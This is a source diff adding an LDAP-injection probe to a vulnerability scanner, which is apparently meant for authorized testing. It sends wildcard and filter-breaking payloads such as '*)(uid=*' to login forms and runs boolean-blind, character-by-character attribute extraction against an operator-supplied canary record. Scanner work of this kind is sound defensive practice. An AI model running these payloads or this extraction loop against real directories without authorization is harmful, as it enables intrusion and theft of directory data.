@@ -1,0 +1,227 @@
+// Dark Matter rule-based scanner — LDAP boolean-blind deep probe (#32).
+//
+// Closes the gap left by ldapi.js (error-based wildcards only):
+//   T1. Boolean oracle inventory — differential baseline matrix. A finding is
+//       filed ONLY if wildcard payloads move the login outcome vs the
+//       wrong-user baseline in a filter-logic-consistent way.
+//   T2. Boolean-blind attribute extraction of OUR OWN canary record —
+//       self-verifying: CONFIRMED only if >=3 extracted chars match the KNOWN
+//       canary value (never touches another user's data).
+//
+// Honest limit (documented in docs/scanner/ldap-blind.md): LDAP has NO
+// SLEEP()/benchmark primitive — time-based blind LDAP is not a reliable
+// class. Any delay must reproduce under a control filter before being cited;
+// otherwise it is a documented skip, never a finding.
+//
+// Depth gating: Quick = T1 only; Standard/Deep = T1 + T2 (T2 needs
+// opts.ldapCanary = { user, attr, value }; skipped gracefully when absent).
+// Every CONFIRMED verdict sits behind a differential oracle per the 100%
+// truth rule. Read-only HTTP, per-run canary values, redirects never followed.
+
+const UA = 'DarkMatter-Scanner/1.0 (+authorized-scan)';
+
+function rand() {
+  return Math.random().toString(36).slice(2, 10);
+}
+
+async function postForm(url, fields, opts = {}) {
+  const ctrl = new AbortController();
+  const t = setTimeout(() => ctrl.abort(), opts.timeoutMs || 15000);
+  try {
+    const res = await fetch(url, {
+      method: 'POST',
+      signal: ctrl.signal,
+      headers: {
+        'User-Agent': UA,
+        'Content-Type': 'application/x-www-form-urlencoded',
+        ...(opts.headers || {}),
+      },
+      body: new URLSearchParams(fields).toString(),
+      redirect: 'manual',
+    });
+    const text = await res.text().catch(() => '');
+    return {
+      status: res.status,
+      text: text.slice(0, 200000),
+      setCookie: res.headers.get('set-cookie') || '',
+      location: res.headers.get('location') || '',
+    };
+  } finally {
+    clearTimeout(t);
+  }
+}
+
+// Response triple: status class + outcome keyword signal + length bucket.
+// Two responses "match" when their triples are equal — the differential oracle.
+function triple(r) {
+  const t = r.text.toLowerCase();
+  const sig = /welcome|dashboard|successfully|logged in|log out|sign out/i.test(t)
+    ? 'allow'
+    : /invalid|wrong|incorrect|denied|fail|not found|unknown|does not exist|bad/i.test(t)
+      ? 'deny'
+      : 'other';
+  return `${r.status < 400 ? 'ok' : 'err'}:${sig}:${Math.floor(r.text.length / 400)}`;
+}
+
+function ev(request, response, impact) {
+  return { request, response, impact_demo: impact, signalCorrelated: true };
+}
+
+// Heuristic: which params look like a username/login identifier.
+function userParams(params) {
+  const re = /user|login|name|mail|uid|account/i;
+  const hits = params.filter((p) => re.test(p));
+  return hits.length ? hits.slice(0, 3) : params.slice(0, 2);
+}
+
+// T1 — boolean oracle inventory. Returns { oracle: bool, matrix, userParam }.
+async function t1Oracle(url, params, opts) {
+  const findings = [];
+  for (const up of userParams(params)) {
+    const wrongUser = `zz_no_such_${rand()}`;
+    const base = {};
+    base[up] = wrongUser;
+    base['password'] = `wrong_${rand()}`;
+    let rBase;
+    try {
+      rBase = await postForm(url, base, opts);
+    } catch {
+      continue;
+    }
+    const tBase = triple(rBase);
+    // Wildcard battery: each must be filter-logic-consistent.
+    const probes = {
+      star: '*',
+      adminStar: 'admin*',
+      zzzStar: `zzz${rand()}*`,
+      paren: '*)(uid=*',
+    };
+    const matrix = { baseline_wrong_user: tBase };
+    let consistent = 0;
+    for (const [k, v] of Object.entries(probes)) {
+      const f = { ...base, [up]: v };
+      let r;
+      try {
+        r = await postForm(url, f, opts);
+      } catch {
+        matrix[k] = 'error';
+        continue;
+      }
+      const t = triple(r);
+      matrix[k] = t;
+      // Filter-logic consistency: a TRUE wildcard ('*') widening the match
+      // should move the outcome; a nonsense wildcard ('zzz*') should not.
+      if (k === 'star' || k === 'paren') {
+        if (t !== tBase) consistent++;
+      } else if (k === 'zzzStar') {
+        if (t === tBase) consistent++;
+      }
+    }
+    const matrixText = Object.entries(matrix)
+      .map(([k, v]) => `${k}=${v}`)
+      .join(' | ');
+    if (consistent >= 2) {
+      findings.push({
+        class: 'ldap_injection',
+        id: `ldap-oracle-${rand()}`,
+        title: 'LDAP injection — boolean oracle detected (filter logic responds to wildcards)',
+        severity: 'medium',
+        url,
+        parameter: up,
+        evidence: ev(
+          `POST ${url} ${up}=* / admin* / zzz* / *)(  (vs wrong-user baseline; redirects NOT followed)`,
+          `Baseline(wrong user): ${tBase}. Matrix: ${matrixText}. Wildcards moved the outcome in a filter-logic-consistent way (${consistent}/3 checks).`,
+          'Differential oracle established: LDAP filter syntax reaches the directory query. Enables boolean-blind extraction (T2).'
+        ),
+      });
+      return { findings, oracle: true, matrix, userParam: up };
+    }
+  }
+  return { findings, oracle: false, matrix: null, userParam: null };
+}
+
+// T2 — boolean-blind extraction of OUR OWN canary attribute.
+// opts.ldapCanary = { user, attr, value }. CONFIRMED only if >=3 extracted
+// chars match the known canary value (self-verifying oracle).
+async function t2Extract(url, userParam, canary, opts) {
+  const findings = [];
+  const { user, attr, value } = canary;
+  const charset = 'abcdefghijklmnopqrstuvwxyz0123456789@._-'.split('');
+  const maxLen = Math.min(8, value.length);
+  let extracted = '';
+  const trueBase = { [userParam]: user, password: `wrong_${rand()}` };
+  let rTrue;
+  try {
+    rTrue = await postForm(url, trueBase, opts);
+  } catch {
+    return findings;
+  }
+  const tTrue = triple(rTrue);
+  for (let i = 0; i < maxLen; i++) {
+    let hit = null;
+    for (const ch of charset) {
+      const guess = extracted + ch;
+      // Truth leg: filter matches iff the prefix is right.
+      const fTrue = {
+        [userParam]: `(&(uid=${user})(${attr}=${guess}*))`,
+        password: `wrong_${rand()}`,
+      };
+      // False control: same shape, impossible value.
+      const fFalse = {
+        [userParam]: `(&(uid=${user})(${attr}=${guess}zzz${rand()}*))`,
+        password: `wrong_${rand()}`,
+      };
+      let rT, rF;
+      try {
+        rT = await postForm(url, fTrue, opts);
+        rF = await postForm(url, fFalse, opts);
+      } catch {
+        break;
+      }
+      // Decision: true leg must differ from the false control in the same
+      // direction as the known-good baseline differs from wrong-user.
+      if (triple(rT) !== triple(rF) && triple(rT) === tTrue) {
+        hit = ch;
+        break;
+      }
+    }
+    if (!hit) break;
+    extracted += hit;
+  }
+  // Self-verify against the KNOWN canary value.
+  let match = 0;
+  for (let i = 0; i < extracted.length; i++) {
+    if (value[i] === extracted[i]) match++;
+  }
+  if (match >= 3 && extracted.length >= 3) {
+    findings.push({
+      class: 'ldap_injection',
+      id: `ldap-blind-${rand()}`,
+      title: 'LDAP injection — boolean-blind attribute extraction (HIGH)',
+      severity: 'high',
+      url,
+      parameter: userParam,
+      evidence: ev(
+        `POST ${url} ${userParam}=(&(uid=${user})(${attr}=<prefix>*)) char-by-char, false-control per guess (redirects NOT followed)`,
+        `Extracted "${extracted}" from our OWN canary record; ${match}/${extracted.length} chars match the known canary value "${value}". Self-verifying oracle: the boolean channel is proven without touching another user's data.`,
+        'Proves attacker-controlled LDAP filter logic with a working boolean oracle — full directory attribute extraction primitive.'
+      ),
+    });
+  }
+  return findings;
+}
+
+export async function probeLdapBlind(url, params, opts = {}) {
+  const findings = [];
+  const depth = opts.depth || 'standard';
+  if (!params || params.length === 0) return findings;
+  const { findings: f1, oracle, userParam } = await t1Oracle(url, params, opts);
+  findings.push(...f1);
+  if (depth === 'quick') return findings;
+  if (oracle && opts.ldapCanary && opts.ldapCanary.user) {
+    findings.push(...(await t2Extract(url, userParam, opts.ldapCanary, opts)));
+  }
+  return findings;
+}
+
+export const __ldapBlindMeta = { phases: ['ldap-blind'], depth: ['quick', 'standard', 'deep'] };
